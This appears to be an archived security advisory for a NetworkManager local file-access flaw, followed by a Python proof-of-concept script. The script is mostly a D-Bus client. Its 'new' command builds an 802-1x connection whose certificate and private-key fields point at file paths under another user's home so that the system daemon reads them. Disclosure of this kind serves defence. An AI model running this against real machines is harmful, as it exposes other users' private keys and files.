source: http://www.securityfocus.com/bid/52206/info

GNOME NetworkManager is prone to a local arbitrary file-access vulnerability.

Local attackers can exploit this issue to read arbitrary files. This may lead to further attacks.

NetworkManager 0.6, 0.7, and 0.9 are vulnerable; other versions may also be affected.

#!/usr/bin/python
#
# Copyright (C) 2011 SUSE LINUX Products GmbH
#
# Author:     Ludwig Nussel
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# version 2 as published by the Free Software Foundation.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

import gobject

import dbus
import dbus.service
import dbus.mainloop.glib

import os
import subprocess

def N_(x): return x

_debug_level = 0
def debug(level, msg):
    if (level <= _debug_level):
	print '<%d>'%level, msg

class NetworkManager(gobject.GObject):

    NM_STATE = {
	      0: 'UNKNOWN',
	     10: 'UNMANAGED',
	     20: 'UNAVAILABLE',
	     30: 'DISCONNECTED',
	     40: 'PREPARE',
	     50: 'CONFIG',
	     60: 'NEED_AUTH',
	     70: 'IP_CONFIG',
	     80: 'IP_CHECK',
	     90: 'SECONDARIES',
	    100: 'ACTIVATED',
	    110: 'DEACTIVATING',
	    120: 'FAILED',
	    }

    NM_DEVICE_TYPE = {
	    0: 'NM_DEVICE_TYPE_UNKNOWN',  # The device type is unknown. 
	    1: 'NM_DEVICE_TYPE_ETHERNET', # The device is wired Ethernet device. 
	    2: 'NM_DEVICE_TYPE_WIFI',     # The device is an 802.11 WiFi device. 
	    3: 'NM_DEVICE_TYPE_UNUSED1',  # Unused
	    4: 'NM_DEVICE_TYPE_UNUSED2',  # Unused
	    5: 'NM_DEVICE_TYPE_BT',        # The device is Bluetooth device that provides PAN or DUN capabilities. 
	    6: 'NM_DEVICE_TYPE_OLPC_MESH', # The device is an OLPC mesh networking device. 
	    7: 'NM_DEVICE_TYPE_WIMAX',     # The device is an 802.16e Mobile WiMAX device. 
	    8: 'NM_DEVICE_TYPE_MODEM', # The device is a modem supporting one or more of analog telephone, CDMA/EVDO, GSM/UMTS/HSPA, or LTE standards to access a cellular or wireline data network. 
	    }

    NM_802_11_AP_SEC = {
	    'NM_802_11_AP_SEC_NONE': 0x0, # Null flag.
	    'NM_802_11_AP_SEC_PAIR_WEP40': 0x1, # Access point supports pairwise 40-bit WEP encryption.
	    'NM_802_11_AP_SEC_PAIR_WEP104': 0x2, # Access point supports pairwise 104-bit WEP encryption.
	    'NM_802_11_AP_SEC_PAIR_TKIP': 0x4, # Access point supports pairwise TKIP encryption.
	    'NM_802_11_AP_SEC_PAIR_CCMP': 0x8, # Access point supports pairwise CCMP encryption.
	    'NM_802_11_AP_SEC_GROUP_WEP40': 0x10, # Access point supports a group 40-bit WEP cipher.
	    'NM_802_11_AP_SEC_GROUP_WEP104': 0x20, # Access point supports a group 104-bit WEP cipher.
	    'NM_802_11_AP_SEC_GROUP_TKIP': 0x40, # Access point supports a group TKIP cipher.
	    'NM_802_11_AP_SEC_GROUP_CCMP': 0x80, # Access point supports a group CCMP cipher.
	    'NM_802_11_AP_SEC_KEY_MGMT_PSK': 0x100, # Access point supports PSK key management.
	    'NM_802_11_AP_SEC_KEY_MGMT_802_1X': 0x200, # Access point supports 802.1x key management.
	    }

    def __init__(self):
	self.bus = dbus.SystemBus()
	self.proxy = None
	self.manager = None
	self.running = False
	self.devices = {}
	self.devices_by_name = {}
	self.aps = {}
	self.ap_by_addr = {}
	self.ap_by_ssid = {}

	self.check_status()

	self.bus.add_signal_receiver(
	    lambda name, old, new: self.nameowner_changed_handler(name, old, new),
		bus_name='org.freedesktop.DBus',
		dbus_interface='org.freedesktop.DBus',
		signal_name='NameOwnerChanged')

	self.bus.add_signal_receiver(
	    lambda device, **kwargs: self.device_add_rm(device, True, **kwargs),
		bus_name='org.freedesktop.NetworkManager',
		dbus_interface = 'org.freedesktop.NetworkManager',
		signal_name = 'DeviceAdded',
		sender_keyword = 'sender')

	self.bus.add_signal_receiver(
	    lambda device, **kwargs: self.device_add_rm(device, False, **kwargs),
		bus_name='org.freedesktop.NetworkManager',
		dbus_interface = 'org.freedesktop.NetworkManager',
		signal_name = 'DeviceRemoved',
		sender_keyword = 'sender')

    def cleanup(self):
	self.switcher = None

    def devstate2name(self, state):
	if state in self.NM_STATE:
	    return self.NM_STATE[state]
	return "UNKNOWN:%s"%state

    def devtype2name(self, type):
	if type in self.NM_DEVICE_TYPE:
	    return self.NM_DEVICE_TYPE[type]
	return "UNKNOWN:%s"%type

    def secflags2str(self, flags):
	a = []
	for key in self.NM_802_11_AP_SEC.keys():
	    if self.NM_802_11_AP_SEC[key] and flags&self.NM_802_11_AP_SEC[key]:
		a.append(key[len('NM_802_11_AP_SEC_'):])
	return ' '.join(a)

    def nameowner_changed_handler(self, name, old, new):
	if name != 'org.freedesktop.NetworkManager':
	    return
	
	off = old and not new
	self.check_status(off)

    def device_add_rm(self, device, added, sender=None, **kwargs):
	if (added):
	    dev = self.bus.get_object("org.freedesktop.NetworkManager", device)
	    props = dbus.Interface(dev, "org.freedesktop.DBus.Properties")
	    name = props.Get("org.freedesktop.NetworkManager.Device", "Interface")
	    devtype = props.Get("org.freedesktop.NetworkManager.Device", "DeviceType")
	    debug(0,"device %s, %s added"%(name, self.devtype2name(devtype)))

	    self.devices[device] = name
	    self.devices_by_name[name] = device

	    if devtype == 2:
		wifi = dbus.Interface(dev, "org.freedesktop.NetworkManager.Device.Wireless")
		aps = wifi.GetAccessPoints()
		for path in aps:
		    ap = self.bus.get_object("org.freedesktop.NetworkManager", path)
		    props = dbus.Interface(ap, "org.freedesktop.DBus.Properties")
		    ssid_raw = props.Get("org.freedesktop.NetworkManager.AccessPoint", "Ssid")
		    addr = props.Get("org.freedesktop.NetworkManager.AccessPoint", "HwAddress")
		    wpaflags = props.Get("org.freedesktop.NetworkManager.AccessPoint", "WpaFlags")
		    rsnflags = props.Get("org.freedesktop.NetworkManager.AccessPoint", "RsnFlags")
		    ssid = ''
		    for b in ssid_raw:
			if b > 20 and b < 126:
			    ssid += str(b)
			else:
			    ssid += '0x%02x'%b

		    self.aps[path] = {
			    'Ssid' : ssid_raw,
			    '_ssid_readable' : ssid,
			    'HwAddress' : addr,
			    'WpaFlags' : wpaflags,
			    'RsnFlags' : rsnflags,
			    }
		    self.ap_by_addr[addr] = path
		    if not ssid in self.ap_by_ssid:
			self.ap_by_ssid[ssid] = set({})
		    self.ap_by_ssid[ssid].add(path)

		for ssid in sorted(self.ap_by_ssid.keys()):
		    print ssid
		    for path in self.ap_by_ssid[ssid]:
			ap = self.aps[path]
			print ' ', ap['HwAddress']
			if ap['WpaFlags']:
			    print "    WPA: ", self.secflags2str(ap['WpaFlags'])
			if ap['RsnFlags']:
			    print "    RSN: ", self.secflags2str(ap['RsnFlags'])
	else:
	    if not device in self.devices:
		debug(0, "got remove signal for unknown device %s removed"%device)
	    else:
		name = self.devices[device]
		del self.devices[device]
		del self.devices_by_name[name]
		debug(0,"device %s removed"%name)

    def _connect_nm(self):
	try:
	    self.proxy = self.bus.get_object("org.freedesktop.NetworkManager", "/org/freedesktop/NetworkManager")
	    self.manager = manager = dbus.Interface(self.proxy, "org.freedesktop.NetworkManager")
	    running = True
	except dbus.DBusException, e:
	    running = False
	    print e

	return running

    def check_status(self, force_off=False):
	if (force_off):
	    running = False
	else:
	    running = self.running
	    if (not self.manager):
		running = self._connect_nm()

	if (running):
	    if (not self.running):
		devices = self.manager.GetDevices()
		for d in devices:
		    self.device_add_rm(d, True)

	if (not running):
	    self.proxy = self.manager = None

	self.running = running
	debug(1,"NM Running: %s"%self.running)

    def addcon(self, params, device, ap = '/'):
	if device[0] != '/':
	    if not device in self.devices_by_name:
		print "Error: device not known"
		sys.exit(1)
	    device = self.devices_by_name[device]
	if ap[0] != '/' and not 'ssid' in params['802-11-wireless']:
	    params['802-11-wireless']['ssid'] = [dbus.Byte(ord(c)) for c in ap]
	    if not ap in self.ap_by_ssid:
		print "Warning: ssid not known"
	    ap = '/'
	else:
	    ap = '/'

	self.manager.AddAndActivateConnection(params, device, ap)

if __name__ == '__main__':

    from optparse import OptionParser

    parser = OptionParser(usage="%prog [options]")
    parser.add_option('--debug', dest="debug", metavar='N',
	    action='store', type='int', default=0,
	    help="debug level")

    (opts, args) = parser.parse_args()
    if opts.debug:
	_debug_level = opts.debug

    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    mainloop = gobject.MainLoop()

    bus = dbus.SystemBus()

    nm = NetworkManager()

    if len(args) == 0:
	#mainloop.run()
	True
    elif args[0] == 'new':
	conn = {
		'connection': {
		    'permissions': [ 'user:joesix:' ],
		    'autoconnect': False,
		    'type': '802-11-wireless',
		    },
		'802-11-wireless': {
		    #'ssid': [ dbus.Byte(ord(c)) for c in "something" ],
		    'mode': 'infrastructure',
		    'security': '802-11-wireless-security',
		    }, 
		'802-1x': {
		    'eap': [ 'tls' ], # peap, ttls
		    'client-cert': [ dbus.Byte(ord(c)) for c in 'file:///home/foo/certs/cert.pem' ] + [ dbus.Byte(0) ],
		    'private-key': [ dbus.Byte(ord(c)) for c in 'file:///home/foo/certs/key.pem' ] + [ dbus.Byte(0) ],
		    'ca-cert': [ dbus.Byte(ord(c)) for c in 'file:///home/foo/certs/cacert.pem' ] + [ dbus.Byte(0) ],
		    'private-key-password': "12345",
		    #'ca-cert': 'hash://server/sha256/5336d308fa263f9f07325baae58ac972876f419527a9bf67c5ede3e668d3a925',
		    #'subject-match': '/CN=blah/emailAddress=foo@bar',
		    #'phase2-auth': 'mschapv2',
		    'identity': 'test1',
		    #'password': 'test1',
		    },
		'802-11-wireless-security': {
		    'key-mgmt': 'wpa-eap',
		    'auth-alg': 'open',
		    },
	}
	dev = args[1]
	ap = None
	if len(args) > 2:
	    ap = args[2]
	nm.addcon(conn, dev, ap)

# vim: sw=4 ts=8 noet